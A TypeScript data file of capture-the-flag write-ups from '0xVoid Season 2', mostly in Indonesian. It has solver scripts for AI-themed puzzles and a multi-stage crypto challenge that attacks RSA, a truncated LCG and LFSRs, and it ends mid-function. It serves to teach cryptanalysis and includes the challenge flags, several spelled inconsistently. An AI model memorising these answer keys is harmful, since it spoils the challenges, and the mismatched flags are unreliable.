import type { WriteUp } from "../types";

export const _0xvoidS2Writeups: WriteUp[] = [
  {
    "id": "0xvoid-s2-ai-acrostic",
    "title": "Acrostic",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** MISC - Acrostic",
    "problemDescription": "**Category:** MISC - Acrostic\n\n### Analysis\n\nPetunjuk:\n\n```\nfirst letter of each line reveals the secret\n```\n\nMengambil huruf pertama setiap baris:\n\n```\nF\nI\nR\nS\nT\nS\nT\nE\nP\n```\n\nDigabung menjadi:\n\n```\nFIRSTSTEP\n```\n\n### Flag\n\n```\n0xV0ID{FIRSTSTEP}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "0xV0ID{FIRSTSTEP}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-checkpointseed",
    "title": "Checkpoint Seed",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** AI - PRNG Reproduction",
    "problemDescription": "**Category:** AI - PRNG Reproduction\n\n### Analysis\n\nSeed diberikan:\n\n```\n8675309\n```\n\nAlgoritma:\n\n```python\nrandom.Random(seed).randrange(256)\n```\n\nNilai tersebut digunakan sebagai keystream XOR.\n\nDekripsi dilakukan dengan:\n\n```python\nrandom.Random(seed)\ncipher_byte ^ random_byte\n```\n\nFlag diperoleh:\n\n```\n0xVO1D{...}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import json, random\r\n\r\ndata=json.load(open(\"checkpoint.json\"))\r\n\r\ncipher=bytes.fromhex(data[\"cipher_hex\"])\r\n\r\nr=random.Random(data[\"seed\"])\r\n\r\nplain=bytes([\r\n    b ^ r.randrange(256)\r\n    for b in cipher\r\n])\r\n\r\nprint(plain.decode())"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xVO1D{...}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-confidencecipher",
    "title": "Confidence Cipher",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** AI - XOR Key Stream",
    "problemDescription": "**Category:** AI - XOR Key Stream\n\n### Analysis\n\nConfidence score digunakan sebagai XOR key stream.\n\nOperasi:\n\n```\nplaintext = cipher XOR confidence_percent\n```\n\nScript:\n\n```python\nchr(cipher ^ confidence)\n```\n\nHasil:\n\n```\n0xVoid{sampling}\n```\n\n### Flag\n\n```\n0xV0ID{sampling}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import csv\r\n\r\nout = \"\"\r\n\r\nwith open(\"confidence_log.csv\") as f:\r\n    rows = csv.DictReader(f)\r\n\r\n    for r in rows:\r\n        c = int(r[\"cipher\"])\r\n        k = int(r[\"confidence_percent\"])\r\n        out += chr(c ^ k)\r\n\r\nprint(out)"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xVoid{sampling}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-embeddingoracle",
    "title": "Embedding Oracle",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** AI - Nearest Neighbor Embedding",
    "problemDescription": "**Category:** AI - Nearest Neighbor Embedding\n\n### Analysis\n\nEmbedding token dan query diberikan.\n\nSetiap query dicari token terdekat menggunakan Euclidean distance.\n\nRumus:\n\n```\ndistance = sqrt((x1-x2)^2 + (y1-y2)^2)\n```\n\nQuery diproses dalam urutan:\n\n```\nq00 - q29\n```\n\nHasil:\n\n```\n0xVoid{nearest_neighbor_knows}\n```\n\n### Flag\n\n```\n0xV0ID{nearest_neighbor_knows}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import csv, math\r\n\r\ntokens=[]\r\nqueries=[]\r\n\r\nwith open(\"embeddings.csv\") as f:\r\n    for r in csv.DictReader(f):\r\n        item=(r[\"label\"], float(r[\"x\"]), float(r[\"y\"]))\r\n\r\n        if r[\"kind\"]==\"token\":\r\n            tokens.append(item)\r\n        else:\r\n            queries.append((r[\"label\"], float(r[\"x\"]), float(r[\"y\"])))\r\n\r\nqueries.sort()\r\n\r\nout=\"\"\r\n\r\nfor q,x,y in queries:\r\n    best=min(\r\n        tokens,\r\n        key=lambda t: math.sqrt((x-t[1])**2+(y-t[2])**2)\r\n    )\r\n    out += best[0]\r\n\r\nprint(out)"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xVoid{nearest_neighbor_knows}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-quietnote",
    "title": "Quiet Note",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** MISC - First Letters / Acrostic",
    "problemDescription": "**Category:** MISC - First Letters / Acrostic\n\n### Analysis\n\nNama file dan challenge memberikan petunjuk:\n\n```\neasy_first_letters\n```\n\nSetiap baris dimulai dengan karakter yang membentuk flag.\n\nCommand:\n\n```bash\ncut -c1 letter.txt\n```\n\nMenghasilkan:\n\n```\n0xV01D{FIRST_LETTERS_NEVER_LIE}\n```\n\n### Flag\n\n```\n0xV01D{FIRST_LETTERS_NEVER_LIE}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "0xV01D{FIRST_LETTERS_NEVER_LIE}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-refusalwithextratokens",
    "title": "Refusal With Extra Tokens",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** AI - Zero Width Steganography",
    "problemDescription": "**Category:** AI - Zero Width Steganography\n\n### Analysis\n\nPesan refusal memiliki hidden token setelah teks terakhir.\n\nKarakter tersembunyi:\n\n```\nU+200B\nU+200C\nU+200D\n```\n\nKarakter tersebut diekstraksi dan dikonversi menjadi binary.\n\n### Mapping\n\n```\nU+200B -> 0\nU+200C/U+200D -> 1\n```\n\nHasil:\n\n```\n0xVoid{invisible_tokens_visible_win}\n```\n\n### Flag\n\n```\n0xV0ID{invisible_tokens_visible_win}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "0xVoid{invisible_tokens_visible_win}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-safetybitfield",
    "title": "Safety Bitfield",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** AI - Bitfield Decoding",
    "problemDescription": "**Category:** AI - Bitfield Decoding\n\n### Analysis\n\nFile berisi keputusan satu bit:\n\n```\ntoken_id\nallowed\n```\n\nBit harus disusun sesuai urutan yang benar, lalu dilakukan voting transformasi.\n\nHasil decoding:\n\n```\n0xVoid{bits}\n```\n\n### Flag\n\n```\n0xV0ID{bits}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import json\r\n\r\ndata=json.load(open(\"safety_bits.txt\"))\r\n\r\ndata=sorted(data,key=lambda x:x[\"token_id\"])\r\n\r\nbits=\"\".join(\"1\" if x[\"allowed\"] else \"0\" for x in data)\r\n\r\nprint(\"[+] bits:\")\r\nprint(bits)\r\nprint(\"[+] length:\",len(bits))\r\n\r\nfor rev in [False,True]:\r\n    b=bits[::-1] if rev else bits\r\n\r\n    out=\"\"\r\n    for i in range(0,len(b),8):\r\n        out+=chr(int(b[i:i+8],2))\r\n\r\n    print(\"reverse =\",rev,repr(out))"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xVoid{bits}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-selfconsistencyvote",
    "title": "Self Consistency Vote",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** AI - Majority Voting",
    "problemDescription": "**Category:** AI - Majority Voting\n\n### Analysis\n\nTerdapat 10 output model yang memiliki error berbeda.\n\nSolusi:\n\n1. Ambil setiap posisi karakter.\n2. Pilih karakter yang paling banyak muncul.\n\nKonsep yang digunakan adalah self-consistency decoding.\n\nHasil:\n\n```\n0xVoid{majority_vote_beats_hallucination}\n```\n\n### Flag\n\n```\n0xV0ID{majority_vote_beats_hallucination}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [],
    "terminalOutputs": [],
    "flag": "0xVoid{majority_vote_beats_hallucination}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-temperatureseven",
    "title": "Temperature Seven",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** AI - XOR Cipher",
    "problemDescription": "**Category:** AI - XOR Cipher\n\n### Analysis\n\nChallenge menyebut:\n\n```\ntemperature: 0.7\n```\n\nTetapi temperature bukan cryptographic key.\n\nPetunjuk:\n\n```\nI simply believed 0.7 looked like a key.\n```\n\nKey yang digunakan:\n\n```\n7\n```\n\nDekripsi:\n\n```\nplaintext = cipher XOR 7\n```\n\nHasil:\n\n```\n0xVoid{temperature_is_not_a_secret}\n```\n\n### Flag\n\n```\n0xV0ID{temperature_is_not_a_secret}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "cipher = [\r\n55,127,81,104,110,99,124,115,98,106,119,98,\r\n117,102,115,114,117,98,88,110,116,88,105,\r\n104,115,88,102,88,116,98,100,117,98,115,122\r\n]\r\n\r\nkey = 7\r\n\r\nprint(bytes([x ^ key for x in cipher]).decode())"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xVoid{temperature_is_not_a_secret}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-ai-tokenizeroffbyone",
    "title": "Tokenizer Off By One",
    "category": "AI",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "**Category:** AI - Tokenizer Reversal",
    "problemDescription": "**Category:** AI - Tokenizer Reversal\n\n### Analysis\n\nVocab menggunakan index mulai dari 0:\n\n```\nvocab_zero_indexed\n```\n\nTetapi token ID digeser +1.\n\nSolusi:\n\n```\ntoken_id - 1\n```\n\nScript:\n\n```python\nflag = \"\".join(vocab[i - 1] for i in ids)\n```\n\nHasil:\n\n```\n0xVoid{humans_start_at_one_models_do_not}\n```\n\n### Flag\n\n```\n0xV0ID{humans_start_at_one_models_do_not}\n```\n\n---",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import json\r\n\r\ndata=json.load(open(\"token_dump.json\"))\r\n\r\nvocab=data[\"vocab_zero_indexed\"]\r\nids=data[\"generated_token_ids\"]\r\n\r\nflag=\"\".join(vocab[i-1] for i in ids)\r\n\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
    "flag": "0xVoid{humans_start_at_one_models_do_not}",
    "lessonsLearned": ""
  },
  {
    "id": "0xvoid-s2-crypto-v01dhandout",
    "title": "V01D Handout",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "0xVoid Season 2",
    "tags": [],
    "description": "Writeup for challenge V01D Handout",
    "problemDescription": "Challenge ini punya tiga lapis seal. Output `transmission.txt` berisi semua data publik, sedangkan `voidlock.py` menjelaskan cara penyegelan.\n\nAlurnya:\n\n1. Seal I memakai RSA `e = 5` dengan dua plaintext yang berjarak tetap `delta`.\n2. Hasil Seal I berisi capsule. Enam belas byte terakhir capsule adalah `PRIME_P` untuk LCG Seal II.\n3. Seal II membocorkan 32 bit atas dari 8 state LCG. State asli direcover memakai lattice karena 96 bit bawah tiap state hilang.\n4. Seed hasil Seal II dipakai untuk derive taps LFSR Seal III.\n5. Seal III memakai tiga LFSR dengan combiner nonlinear. Known plaintext header cukup untuk correlation attack pada register 19-bit dan 23-bit, lalu register 21-bit diselesaikan sebagai sistem linear GF(2).\n6. Keystream dibuat ulang dan ciphertext didekripsi.\n\nFlag:\n\n```\n0xV0ID{W0W_Y0U_4C7U4LLY_F0UND_M3!!}\n```",
    "tools": [],
    "analysis": "Dari `voidlock.py`, Seal I membuat:\n\n```python\nm1 = int.from_bytes(capsule, \"big\")\nm2 = m1 + DELTA\nc1 = pow(m1, 5, n)\nc2 = pow(m2, 5, n)\n```\n\nIni pola Franklin-Reiter related-message attack. Dua pesan RSA punya hubungan linear:\n\n```\nm2 = m1 + delta\n```\n\nKarena exponent kecil dan modulus sama, `m1` bisa diambil dari gcd polynomial:\n\n```\ngcd(x^5 - c1, (x + delta)^5 - c2) mod n\n```\n\nGCD tersebut menghasilkan polynomial linear `x - m1`.\n\nCapsule dari Seal I punya struktur:\n\n```python\nCAPSULE_MAGIC = b\"0xV0ID//SEAL-I//\"\nCAPSULE_NOISE = 208\ncapsule = CAPSULE_MAGIC + NOISE + PRIME_P.to_bytes(16, \"big\")\n```\n\nSetelah `m1` direcover, capsule valid karena diawali magic:\n\n```\n0xV0ID//SEAL-I//\n```\n\nEnam belas byte terakhir capsule menghasilkan prime LCG:\n\n```\nPRIME_P = 0xd8e6960ff5ed04c81cfbe022e774e809\n```\n\nSeal II memakai LCG:\n\n```python\nx = x0 % p\nfor _ in range(8):\n    leak.append(x >> 96)\n    x = (a * x + b) % p\n```\n\nLeak hanya 32 bit atas. Sisanya 96 bit bawah tidak diketahui.\n\nTidak perlu menjalankan binary atau service. Semua komponen cryptographic diberikan di `voidlock.py`, jadi solve cukup direproduksi secara lokal.\n\nValidasi dilakukan lewat struktur plaintext Seal III:\n\n```python\nHEADER = b\"[0xV0ID // SECURE TRANSMISSION]\\n...PAYLOAD: \"\nFOOTER = b\"\\n[EOT]\\n\"\n```\n\nPlaintext hasil decrypt harus diawali `HEADER` dan diakhiri `FOOTER`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "File yang dipakai:\n\n```\ntransmission.txt\nvoidlock.py\n```\n\n`transmission.txt` menyimpan nilai publik untuk tiga seal:\n\n```\nSEAL I   : n, e, delta, c1, c2\nSEAL II  : a, b, leak\nSEAL III : ct\n```\n\n`voidlock.py` memperlihatkan algoritma penyegelan, termasuk format capsule, LCG, derive taps, LFSR, header, dan footer plaintext."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "### Seal I\n\nRecover `m1` dengan Franklin-Reiter:\n\n```\nf(x) = x^5 - c1\ng(x) = (x + delta)^5 - c2\n```\n\nGCD polynomial modulo `n` menghasilkan root `m1`.\n\n### Seal II\n\nMisal:\n\n```\nx_i = leak_i * 2^96 + u_i\n0 <= u_i < 2^96\n```\n\nLCG bisa ditulis sebagai:\n\n```\nx_i = A_i * x_0 + C_i mod p\n```\n\nKarena `x_0 = leak_0 * 2^96 + u_0`, didapat persamaan:\n\n```\nA_i * u_0 - u_i = leak_i*2^96 - A_i*leak_0*2^96 - C_i mod p\n```\n\nSemua `u_i` kecil, jadi ini diselesaikan dengan lattice small-error. Hasil seed akhir LCG:\n\n```\nseed = 0x258824d7b8c187a7bfe3bd77571dbac5\n```\n\n### Seal III\n\nSeed dipakai untuk derive taps:\n\n```\nALPHA taps = 0x6df19\nBETA  taps = 0xb7d01\nGAMMA taps = 0xc112d\n```\n\nCombiner Seal III:\n\n```\nz = (x1 & x2) ^ (x2 & x3) ^ x3\n```\n\nFungsi ini punya korelasi kuat dengan `x1` dan `x3`. Header plaintext sudah diketahui, jadi keystream awal bisa dihitung:\n\n```\nknown_keystream = ct_prefix XOR HEADER\n```\n\nRegister ALPHA 19-bit dan GAMMA 23-bit dicari dengan correlation attack terhadap known keystream. State yang ditemukan:\n\n```\nALPHA = 0x36229\nGAMMA = 0x2a842f\n```\n\nSetelah `x1` dan `x3` diketahui, combiner menjadi:\n\n```\nz = x2 * (x1 XOR x3) XOR x3\n```\n\nSaat `x1 XOR x3 = 1`, bit output BETA langsung diketahui:\n\n```\nx2 = z XOR x3\n```\n\nBit BETA yang terkumpul cukup untuk menyelesaikan state BETA sebagai sistem linear GF(2):\n\n```\nBETA = 0x580cb\n```\n\nKeystream penuh dibuat ulang, lalu ciphertext didekripsi."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve_v01d_handout.py` melakukan semua langkah otomatis:\n\n1. Parse `transmission.txt` jika ada.\n2. Recover capsule Seal I.\n3. Ambil `PRIME_P` dari 16 byte terakhir capsule.\n4. Recover seed Seal II memakai lattice LLL kecil.\n5. Derive taps LFSR dari seed.\n6. Recover state ALPHA dan GAMMA dengan correlation attack.\n7. Recover state BETA dengan eliminasi linear GF(2).\n8. Decrypt `ct` dan extract payload di antara `HEADER` dan `FOOTER`.\n\nScript sengaja tidak butuh Sage. Untuk langkah correlation cepat, script memakai `numpy`."
      },
      {
        "title": "Cara Menjalankan",
        "content": "Dari folder challenge:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve_v01d_handout.py\n```\n\nOutput penting:\n\n```\n[+] Seal I: Franklin-Reiter RSA\n    PRIME_P = 0xd8e6960ff5ed04c81cfbe022e774e809\n[+] Seal II: truncated LCG lattice\n    seed    = 0x258824d7b8c187a7bfe3bd77571dbac5\n[+] Seal III: LFSR correlation + GF(2) solve\n    taps    = 0x6df19, 0xb7d01, 0xc112d\n    states  = 0x36229, 0x580cb, 0x2a842f\n[+] flag = 0xV0ID{W0W_Y0U_4C7U4LLY_F0UND_M3!!}\n```\n\nKalau `numpy` belum ada:\n\n```bash\npip install numpy\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n# V01D Handout solver\r\n# Three seals:\r\n#   1) Franklin-Reiter related-message RSA -> recover capsule -> PRIME_P\r\n#   2) truncated LCG -> small-error lattice -> recover final seed\r\n#   3) nonlinear combiner of 3 LFSRs -> correlation + linear solve -> decrypt\r\n\r\nimport hashlib\r\nimport re\r\nfrom fractions import Fraction\r\n\r\n# -----------------------------\r\n# Default constants from transmission.txt\r\n# -----------------------------\r\nDEFAULTS = {\r\n    \"n\": int(\"25928782651320620641992939140254039773053786143820023022156108435673795888462270829259940673823214637262717952358987391353085730564901510124603705804524112129476757566788142657088664175065593801641965381026991405255727859541175048223240770122323050535833715088675068682271090820084603319348688347351380861828242704714087132514926072521191737125605753678645790120657253978542547752236110505793854886171416458968419171851938582488979266129737463791105500554112134356498730998376352918821416032348958045483800151660133625684914738099274709079396467282048633239278081191552849291204257984704422013322792106841287335460719\"),\r\n    \"e\": 5,\r\n    \"delta\": int(\"6833830782908252247261123253047\"),\r\n    \"c1\": int(\"2271166609354636919573347128840161371936229585863094230781200269193697434103766416960877947863137367309986938975665479588759510782654663865238207041844510373806887525535495510274789717076202255998760674528063535376982602045898972554740783752572007808625255837024569184071895615210635348690959062860007894570514343164562507439453606004265146656456457932347175386259112190734390287327994321167691079767562237904194404573437094738297816979714864588518384761278586142107820759294318139469385737698093641771095573359179821670180757583384120018468170963726551440086225358842440503171717002348714648811598284419231312422128\"),\r\n    \"c2\": int(\"21509286942876035740813203357561936979765841272579839022736609779635127483686155752043042270306807257492479689909872247694448834824737706970596168518041304670676582963323105074595769264935471267110127006490053258150836273217655012309996504529536284884763861961983138941430380931035377367474034196336478607617884810191902583757301606279109781032863534766846457607838041432051211158968261992230153124492441511171685297367319014610821293109532651264152683844734149471044318252404555037211418912826801581503805886363290247937041102939213895836430529539518384673470765379110379450273823891472725315186603525620809677838951\"),\r\n    \"a\": int(\"236546365290959227914433225187023916963\"),\r\n    \"b\": int(\"167616762206619817706864135870591968753\"),\r\n    \"leak\": [3531552479, 2499828603, 2190393553, 1481676222, 1690883128, 2210042718, 41709825, 3439567070],\r\n    \"ct\": bytes.fromhex(\"ef10add81097716c9c856a7903d8025a6182a6d0c5219145a72e81c399fac24e7e14493269e45c59f6e560b0a43ae1f115556cee064a8288857249a9a841c889eff03b03fe949dd3838e7d176997513fd9c367cb38faa6536a1342aabc733b1059bb73979549a7ff16f2f744161df3e26b908ff79fedd422ed39f570f773308bbdf3585bed76016a0a3d1a50cc3579d19a043853f9d479d4325e35e01055a37fdbfe97db364aa91481206470e8e3a14eedce7583ca1eabf40a7af3e45d\"),\r\n}\r\n\r\nE = 5\r\nTRUNC = 96\r\nLENGTHS = (19, 21, 23)\r\nMERSENNE_FACTORS = {\r\n    19: (524287,),\r\n    21: (7, 127, 337),\r\n    23: (47, 178481),\r\n}\r\nHEADER = (b\"[0xV0ID // SECURE TRANSMISSION]\\n\"\r\n          b\"NODE   : V-7 (NULLSTAR)\\n\"\r\n          b\"CLASS  : OMEGA / EYES-ONLY\\n\"\r\n          b\"NOTICE : keystream is single-use, do not reissue seals\\n\"\r\n          b\"PAYLOAD: \")\r\nFOOTER = b\"\\n[EOT]\\n\"\r\n\r\n\r\ndef parse_transmission(path=\"transmission.txt\"):\r\n    \"\"\"Use transmission.txt when present, otherwise use embedded constants.\"\"\"\r\n    try:\r\n        txt = open(path, \"r\", encoding=\"utf-8\").read()\r\n    except FileNotFoundError:\r\n        return dict(DEFAULTS)\r\n\r\n    def grab_int(name):\r\n        m = re.search(rf\"^{name}\\s*=\\s*([0-9]+)\", txt, re.M)\r\n        if not m:\r\n            raise ValueError(f\"missing {name}\")\r\n        return int(m.group(1))\r\n\r\n    leak_m = re.search(r\"^leak\\s*=\\s*\\[([^\\]]+)\\]\", txt, re.M)\r\n    ct_m = re.search(r\"^ct\\s*=\\s*([0-9a-fA-F]+)\", txt, re.M)\r\n    if not leak_m or not ct_m:\r\n        raise ValueError(\"missing leak/ct\")\r\n\r\n    return {\r\n        \"n\": grab_int(\"n\"),\r\n        \"e\": grab_int(\"e\"),\r\n        \"delta\": grab_int(\"delta\"),\r\n        \"c1\": grab_int(\"c1\"),\r\n        \"c2\": grab_int(\"c2\"),\r\n        \"a\": grab_int(\"a\"),\r\n        \"b\": grab_int(\"b\"),\r\n        \"leak\": [int(x.strip()) for x in leak_m.group(1).split(\",\")],\r\n        \"ct\": bytes.fromhex(ct_m.group(1)),\r\n    }\r\n\r\n\r\n# -----------------------------\r\n# Seal I: Franklin-Reiter RSA\r\n# -----------------------------\r\ndef poly_trim(poly, mod):\r\n    poly = [x % mod for x in poly]\r\n    while len(poly) > 1 and poly[-1] == 0:\r\n        poly.pop()\r\n    return poly\r\n\r\n\r\ndef poly_divmod(a, b, mod):\r\n    a = poly_trim(a[:], mod)\r\n    b = poly_trim(b[:], mod)\r\n    if b == [0]:\r\n        raise ZeroDivisionError\r\n    inv_lc = pow(b[-1], -1, mod)\r\n    q = [0] * max(1, len(a) - len(b) + 1)\r\n    while len(a) >= len(b) and a != [0]:\r\n        d = len(a) - len(b)\r\n        coef = a[-1] * inv_lc % mod\r\n        q[d] = coef\r\n        for i in range(len(b)):\r\n            a[i + d] = (a[i + d] - coef * b[i]) % mod\r\n        a = poly_trim(a, mod)\r\n    return poly_trim(q, mod), a\r\n\r\n\r\ndef poly_gcd(a, b, mod):\r\n    a = poly_trim(a, mod)\r\n    b = poly_trim(b, mod)\r\n    while b != [0]:\r\n        _, r = poly_divmod(a, b, mod)\r\n        a, b = b, r\r\n    inv_lc = pow(a[-1], -1, mod)\r\n    return [(x * inv_lc) % mod for x in a]\r\n\r\n\r\ndef recover_capsule(n, delta, c1, c2):\r\n    # gcd(x^5-c1, (x+delta)^5-c2) over Z_n gives x-m.\r\n    f = [(-c1) % n, 0, 0, 0, 0, 1]\r\n    g = [0] * 6\r\n    # coefficients of (x + delta)^5 - c2, low -> high\r\n    binom = [1, 5, 10, 10, 5, 1]\r\n    for k in range(6):\r\n        g[k] = binom[k] * pow(delta, 5 - k, n)\r\n    g[0] = (g[0] - c2) % n\r\n    g = [x % n for x in g]\r\n\r\n    h = poly_gcd(f, g, n)\r\n    if len(h) != 2:\r\n        raise RuntimeError(f\"unexpected gcd degree {len(h)-1}\")\r\n    m = (-h[0]) % n\r\n    return m.to_bytes((m.bit_length() + 7) // 8, \"big\")\r\n\r\n\r\n# -----------------------------\r\n# Seal II: truncated LCG lattice\r\n# -----------------------------\r\ndef dot(u, v):\r\n    return sum(a * b for a, b in zip(u, v))\r\n\r\n\r\ndef lll_reduction(rows, delta=Fraction(3, 4)):\r\n    \"\"\"Small exact LLL implementation. Good enough for the 9-dim embedding here.\"\"\"\r\n    B = [list(map(int, row)) for row in rows]\r\n    n = len(B)\r\n    m = len(B[0])\r\n\r\n    def gs():\r\n        mu = [[Fraction(0) for _ in range(n)] for __ in range(n)]\r\n        bstar = [[Fraction(0) for _ in range(m)] for __ in range(n)]\r\n        norm = [Fraction(0) for _ in range(n)]\r\n        for i in range(n):\r\n            bstar[i] = [Fraction(x) for x in B[i]]\r\n            for j in range(i):\r\n                mu[i][j] = Fraction(dot(B[i], bstar[j]), norm[j]) if norm[j] else Fraction(0)\r\n                if mu[i][j]:\r\n                    bstar[i] = [bstar[i][k] - mu[i][j] * bstar[j][k] for k in range(m)]\r\n            norm[i] = sum(x * x for x in bstar[i])\r\n        return mu, norm\r\n\r\n    k = 1\r\n    mu, norm = gs()\r\n    while k < n:\r\n        for j in range(k - 1, -1, -1):\r\n            q = int(round(mu[k][j]))\r\n            if q:\r\n                B[k] = [B[k][i] - q * B[j][i] for i in range(m)]\r\n                mu, norm = gs()\r\n        if norm[k] >= (delta - mu[k][k - 1] * mu[k][k - 1]) * norm[k - 1]:\r\n            k += 1\r\n        else:\r\n            B[k], B[k - 1] = B[k - 1], B[k]\r\n            mu, norm = gs()\r\n            k = max(k - 1, 1)\r\n    return B\r\n\r\n\r\ndef recover_lcg_seed(p, A, Bc, leaks):\r\n    base = 1 << TRUNC\r\n    Y = [v * base for v in leaks]\r\n\r\n    As, Cs = [], []\r\n    aa, cc = 1, 0\r\n    for _ in leaks:\r\n        As.append(aa % p)\r\n        Cs.append(cc % p)\r\n        cc = (A * cc + Bc) % p\r\n        aa = (A * aa) % p\r\n\r\n    # x_i = A_i*(Y0+u0)+C_i = Y_i+u_i mod p\r\n    # A_i*u0 - u_i = Y_i - A_i*Y0 - C_i mod p, all u_i < 2^96.\r\n    K = [(Y[i] - As[i] * Y[0] - Cs[i]) % p for i in range(1, len(leaks))]\r\n    dim = len(K) + 2\r\n    M = base\r\n\r\n    rows = []\r\n    rows.append([1] + [As[i] for i in range(1, len(leaks))] + [0])\r\n    for j in range(len(K)):\r\n        row = [0] * dim\r\n        row[1 + j] = p\r\n        rows.append(row)\r\n    rows.append([0] + K + [M])\r\n\r\n    red = lll_reduction(rows)\r\n    candidates = [r for r in red if abs(r[-1]) == M]\r\n\r\n    for row in candidates:\r\n        # The embedding may return +/- the short error vector.\r\n        for sgn in (1, -1):\r\n            us = [sgn * x for x in row[:-1]]\r\n            if not all(0 <= u < base for u in us):\r\n                continue\r\n            x = (Y[0] + us[0]) % p\r\n            ok = True\r\n            for leak in leaks:\r\n                if (x >> TRUNC) != leak:\r\n                    ok = False\r\n                    break\r\n                x = (A * x + Bc) % p\r\n            if ok:\r\n                return x\r\n        # Sometimes signs are mixed only by presentation; absolute values are safe to test.\r\n        us = [abs(x) for x in row[:-1]]\r\n        if all(0 <= u < base for u in us):\r\n            x = (Y[0] + us[0]) % p\r\n            ok = True\r\n            for leak in leaks:\r\n                if (x >> TRUNC) != leak:\r\n                    ok = False\r\n                    break\r\n                x = (A * x + Bc) % p\r\n            if ok:\r\n                return x\r\n    raise RuntimeError(\"LCG seed not recovered\")\r\n\r\n\r\n# -----------------------------\r\n# Seal III helpers from voidlock.py\r\n# -----------------------------\r\ndef gf2_mulmod(a, b, mod, n):\r\n    r = 0\r\n    while b:\r\n        if b & 1:\r\n            r ^= a\r\n        b >>= 1\r\n        a <<= 1\r\n        if a >> n & 1:\r\n            a ^= mod\r\n    return r\r\n\r\n\r\ndef gf2_powmod(base, exp, mod, n):\r\n    r, base = 1, base % (1 << n)\r\n    while exp:\r\n        if exp & 1:\r\n            r = gf2_mulmod(r, base, mod, n)\r\n        base = gf2_mulmod(base, base, mod, n)\r\n        exp >>= 1\r\n    return r\r\n\r\n\r\ndef is_primitive(taps, n):\r\n    if not taps & 1:\r\n        return False\r\n    poly = taps | (1 << n)\r\n    order = (1 << n) - 1\r\n    return gf2_powmod(2, order, poly, n) == 1 and all(\r\n        gf2_powmod(2, order // q, poly, n) != 1 for q in MERSENNE_FACTORS[n]\r\n    )\r\n\r\n\r\ndef derive_taps(seed, n, label):\r\n    xof = hashlib.shake_256(\r\n        b\"VOIDLOCK/TAPS/\" + label + b\"/\" + seed.to_bytes(16, \"big\")\r\n    ).digest(8192)\r\n    for i in range(0, len(xof) - 4, 4):\r\n        cand = 